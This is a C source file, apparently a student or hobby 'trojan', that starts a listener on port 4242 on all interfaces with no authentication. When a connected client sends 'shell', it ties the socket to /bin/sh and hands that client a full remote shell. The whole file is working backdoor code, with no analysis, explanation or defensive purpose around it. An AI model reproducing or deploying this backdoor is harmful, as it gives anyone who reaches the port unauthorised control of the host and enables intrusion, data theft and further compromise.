#include "trojan.h"

#define MAX_CLIENTS 3

int active_connections = 0;
pthread_mutex_t connection_mutex = PTHREAD_MUTEX_INITIALIZER;

void *handle_client(void *arg)
{
    int client_socket = *(int *)arg;

    char buffer[1024] = {0};

    send(client_socket, "Connection established\n", strlen("Connection established\n"), 0);
  
    while (1) {
        ssize_t valread = read(client_socket, buffer, sizeof(buffer) - 1);
        if (valread <= 0) {
            break;
        }

        buffer[valread] = '\0';
        printf("Received: %s\n", buffer);

        if (!strncmp(buffer, "shell", strlen("shell"))) {
            dup2(client_socket, 0);
            dup2(client_socket, 1);
            dup2(client_socket, 2);
            char * const argv[] = {"/bin/sh", NULL};
            execve("/bin/sh", argv, NULL);
        }
        if (!strncmp(buffer, "quit", 4)) {
            break;
        }
    }

    close(client_socket);

    pthread_mutex_lock(&connection_mutex);
    active_connections--;
    pthread_mutex_unlock(&connection_mutex);

    return NULL;
}

void start_socket_listener()
{
    int server_fd;
    struct sockaddr_in address;
    int opt = 1;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(4242);

    bind(server_fd, (struct sockaddr *)&address, sizeof(address));
    listen(server_fd, MAX_CLIENTS);

    printf("Server listening on port 4242\n");

    while (1)
    {
        int new_socket;
        socklen_t addrlen = sizeof(address);

        new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen);
        printf("New connection attempt...\n");

        pthread_mutex_lock(&connection_mutex);
        if (active_connections >= MAX_CLIENTS) {
            pthread_mutex_unlock(&connection_mutex);
            send(new_socket, "Connection refused\n", strlen("Connection refused\n"), 0);
            close(new_socket);
            continue;
        }
        active_connections++;
        pthread_mutex_unlock(&connection_mutex);

        pthread_t thread_id;
        pthread_create(&thread_id, NULL, handle_client, &new_socket);
        pthread_detach(thread_id);
    }

    close(server_fd);
}

int main(int ac, char **av) {
    (void)ac;
    (void)av;
    start_socket_listener();
    return 0;
}